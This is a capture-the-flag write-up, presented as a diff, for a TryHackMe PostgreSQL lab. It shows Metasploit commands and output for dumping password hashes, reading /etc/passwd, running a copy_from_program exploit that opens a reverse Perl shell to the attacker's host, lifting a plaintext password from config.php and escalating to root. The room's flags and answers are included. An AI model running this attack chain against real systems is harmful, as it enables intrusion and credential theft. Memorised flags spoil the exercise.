@@ -337,3 +337,343 @@ Matching Modules
    8   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection                                                            
    9   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility                                                                                        
    10  auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query                                                                                 
+   11  auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query                                                                                 
+   12  auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe                                                                                        
+   13  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution                                                                          
+   14  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution                                                              
+   15  auxiliary/scanner/postgres/postgres_hashdump                                 normal     No     Postgres Password Hashdump                                                                                      
+   16  auxiliary/scanner/postgres/postgres_schemadump                               normal     No     Postgres Schema Dump                                                                                            
+   17  auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
+   18  post/linux/gather/vcenter_secrets_dump                      2022-04-15       normal     No     VMware vCenter Secrets Dump
+
+Interact with a module by name or index. For example info 18, use 18 or use post/linux/gather/vcenter_secrets_dump
+```
+```text
+msf6 auxiliary(admin/postgres/postgres_sql) > use auxiliary/scanner/postgres/postgres_hashdump
+```
+```text
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > show options
+
+Module options (auxiliary/scanner/postgres/postgres_hashdump):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  postgres         yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random
+                                         password.
+   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-fram
+                                        ework/wiki/Using-Metasploit
+   RPORT     5432             yes       The target port
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+   USERNAME  postgres         yes       The username to authenticate as
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > set rhost 10.10.183.253
+rhost => 10.10.183.253
+```
+```text
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > set password password
+password => password
+```
+```text
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > run
+
+[+] Query appears to have run successfully
+[+] Postgres Server Hashes
+======================
+
+ Username   Hash
+ --------   ----
+ darkstart  md58842b99375db43e9fdf238753623a27d
+ poster     md578fb805c7412ae597b399844a54cce0a
+ postgres   md532e12f215ba27cb750c9e093ce4b5127
+ sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
+ ti         md57af9ac4c593e9e4f275576e13f935579
+ tryhackme  md503aab1165001c8f8ccae31a8824efddc
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+```text
+msf6 auxiliary(scanner/postgres/postgres_hashdump) > use auxiliary/admin/postgres/postgres_readfile
+```
+```text
+msf6 auxiliary(admin/postgres/postgres_readfile) > show options
+
+Module options (auxiliary/admin/postgres/postgres_readfile):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random
+                                         password.
+   RFILE     /etc/passwd      yes       The remote file
+   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-fram
+                                        ework/wiki/Using-Metasploit
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 auxiliary(admin/postgres/postgres_readfile) > set rhost 10.10.183.253
+rhost => 10.10.183.253
+```
+```text
+msf6 auxiliary(admin/postgres/postgres_readfile) > set password password
+password => password
+```
+```text
+msf6 auxiliary(admin/postgres/postgres_readfile) > run
+[*] Running module against 10.10.183.253
+
+Query Text: 'CREATE TEMP TABLE SdoVdFUHYe (INPUT TEXT);
+      COPY SdoVdFUHYe FROM '/etc/passwd';
+      SELECT * FROM SdoVdFUHYe'
+=================================================================================================================================
+
+    input
+    -----
+    #/home/dark/credentials.txt
+    _apt:x:105:65534::/nonexistent:/bin/false
+    alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    dark:x:1001:1001::/home/dark:
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    messagebus:x:106:110::/var/run/dbus:/bin/false
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    root:x:0:0:root:/root:/bin/bash
+    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    syslog:x:104:108::/home/syslog:/bin/false
+    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    uuidd:x:107:111::/run/uuidd:/bin/false
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+#/home/dark/credentials.txt
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+dark:x:1001:1001::/home/dark:
+[+] 10.10.183.253:5432 Postgres - /etc/passwd saved in /home/kali/.msf4/loot/20221224122634_default_10.10.183.253_postgres.file_545925.txt
+[*] Auxiliary module execution completed
+```
+```text
+msf6 auxiliary(admin/postgres/postgres_readfile) > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+[*] Using configured payload cmd/unix/reverse_perl
+```
+```text
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > show options
+
+Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):
+
+   Name               Current Setting  Required  Description
+   ----               ---------------  --------  -----------
+   DATABASE           template1        yes       The database to authenticate against
+   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
+   PASSWORD           postgres         no        The password for the specified username. Leave blank for
+                                                  a random password.
+   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasp
+                                                 loit-framework/wiki/Using-Metasploit
+   RPORT              5432             yes       The target port (TCP)
+   TABLENAME          RhMQTIYV3Ey      yes       A table name that does not exist (To avoid deletion)
+   USERNAME           postgres         yes       The username to authenticate as
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+View the full module info with the info, or info -d command.
+```
+```text
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhost 10.10.183.253
+rhost => 10.10.183.253
+```
+```text
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password password
+password => password
+```
+```text
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost 10.8.19.103
+lhost => 10.8.19.103
+```
+
+## Privilege Escalation
+```text
+msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
+
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] 10.10.183.253:5432 - 10.10.183.253:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
+[*] 10.10.183.253:5432 - Exploiting...
+[+] 10.10.183.253:5432 - 10.10.183.253:5432 - RhMQTIYV3Ey dropped successfully
+[+] 10.10.183.253:5432 - 10.10.183.253:5432 - RhMQTIYV3Ey created successfully
+[+] 10.10.183.253:5432 - 10.10.183.253:5432 - RhMQTIYV3Ey copied successfully(valid syntax/command)
+[+] 10.10.183.253:5432 - 10.10.183.253:5432 - RhMQTIYV3Ey dropped successfully(Cleaned)
+[*] 10.10.183.253:5432 - Exploit Succeeded
+[*] Command shell session 1 opened (10.8.19.103:4444 -> 10.10.183.253:59728) at 2022-12-24 12:33:12 -0500
+
+whoami
+postgres
+shel
+shell
+[*] Trying to find binary 'python' on the target machine
+[-] python not found
+[*] Trying to find binary 'python3' on the target machine
+[*] Found python3 at /usr/bin/python3
+[*] Using `python` to pop up an interactive shell
+[*] Trying to find binary 'bash' on the target machine
+[*] Found bash at /bin/bash
+bash
+bash
+
+postgres@ubuntu:/var/lib/postgresql/9.5/main$ find / -type f -name user.txt 2>/dev/null
+<stgresql/9.5/main$ find / -type f -name user.txt 2>/dev/null                
+/home/alison/user.txt
+postgres@ubuntu:/var/lib/postgresql/9.5/main$ cat /home/alison/user.txt
+cat /home/alison/user.txt
+cat: /home/alison/user.txt: Permission denied
+postgres@ubuntu:/var/lib/postgresql/9.5/main$ cd /var/www/html
+cd /var/www/html
+postgres@ubuntu:/var/www/html$ ls
+ls
+config.php  poster
+postgres@ubuntu:/var/www/html$ cat config.php
+cat config.php
+<?php 
+
+        $dbhost = "127.0.0.1";
+        $dbuname = "alison";
+        $dbpass = "p4ssw0rdS3cur3!#";
+        $dbname = "mysudopassword";
+
+?>postgres@ubuntu:/var/www/html$ su alison
+su alison
+Password: p4ssw0rdS3cur3!#
+
+alison@ubuntu:/var/www/html$ cat /home/alison/user.txt
+cat /home/alison/user.txt
+THM{postgresql_fa1l_conf1gurat1on}
+
+privesc
+
+alison@ubuntu:/var/www/html$ sudo -l
+sudo -l
+[sudo] password for alison: p4ssw0rdS3cur3!#
+
+Matching Defaults entries for alison on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alison may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+alison@ubuntu:/var/www/html$ sudo -s
+sudo -s
+root@ubuntu:/var/www/html# cat /root/root.txt
+cat /root/root.txt
+THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
+
+or
+
+"sudo -s" es un comando de Unix y Linux que se utiliza para ejecutar un shell de sistema con privilegios de superusuario. El comando "sudo" (superuser do) permite a los usuarios ejecutar comandos con privilegios de superusuario (también conocidos como "root"), lo que les permite realizar cambios en el sistema que de otra manera podrían estar restringidos. Al añadir la opción "-s", el comando abre una sesión interactiva de shell con privilegios de superusuario, lo que significa que puedes ejecutar varios comandos como superusuario sin tener que volver a escribir "sudo" cada vez.
+
+Por ejemplo, si quisieras instalar un paquete de software en un sistema Linux, podrías usar el comando "sudo -s" para abrir una sesión de shell de superusuario y luego ejecutar el comando de instalación del paquete. Esto te permite realizar cambios en el sistema que de otra manera podrían estar restringidos para un usuario normal.
+
+Es importante tener en cuenta que el comando "sudo -s" debe utilizarse con precaución, ya que los cambios realizados como superusuario pueden tener consecuencias graves si no se realizan correctamente. Por lo tanto, es importante asegurarse de comprender los comandos que se van a ejecutar antes de utilizar "sudo -s".
+
+alison@ubuntu:/var/www/html$ sudo su
+sudo su
+root@ubuntu:/var/www/html# :)
+
+:)
+```
+What is the rdbms installed on the server?
+*PostgreSQL*
+What port is the rdbms running on?
+*5432*
+PostgreSQL es un sistema de gestión de bases de datos relacionales de código abierto y de alto rendimiento. Es muy versátil y se puede utilizar en una amplia gama de aplicaciones, desde bases de datos simples hasta sistemas de gestión empresariales complejos.
+Un ejemplo de uso de PostgreSQL podría ser una base de datos para una pequeña empresa de venta de productos en línea. Podríamos tener una tabla de productos con columnas como ID de producto, nombre del producto, precio y descripción. También podríamos tener una tabla de clientes con columnas como ID de cliente, nombre, dirección de correo electrónico y dirección de envío. Podríamos relacionar estas tablas mediante una tabla de pedidos, que tendría una columna con el ID del producto y otra con el ID del cliente. De esta manera, podríamos rastrear qué productos han sido pedidos por qué clientes y en qué momento.
+PostgreSQL también ofrece una amplia variedad de características avanzadas, como índices, vistas y procedimientos almacenados, que permiten a los usuarios realizar consultas y manipular datos de manera más eficiente y flexible.
+Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information.
+Completed
+After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?
+*auxiliary/scanner/postgres/postgres_login*
+What are the credentials you found?
+example: user:password
+*postgres:password*
+What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?
+*auxiliary/admin/postgres/postgres_sql*
+Based on the results of #6, what is the rdbms version installed on the server?
+*9.5.21*
+What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?
+*auxiliary/scanner/postgres/postgres_hashdump*
+How many user hashes does the module dump?
+*6*
+What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?
+*auxiliary/admin/postgres/postgres_readfile*
+What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?
+*exploit/multi/postgres/postgres_copy_from_program_cmd_exec*
+Compromise the machine and locate user.txt
+Change table name for the exploit mentioned above.
+Escalate privileges and obtain root.txt
+
+## Flags / Answers
+- ***THM{postgresql_fa1l_conf1gurat1on}***
+- ***THM{c0ngrats_for_read_the_f1le_w1th_credent1als}***
+
+## Notes / Lessons Learned
+[[Advent of Cyber 2022]]
+
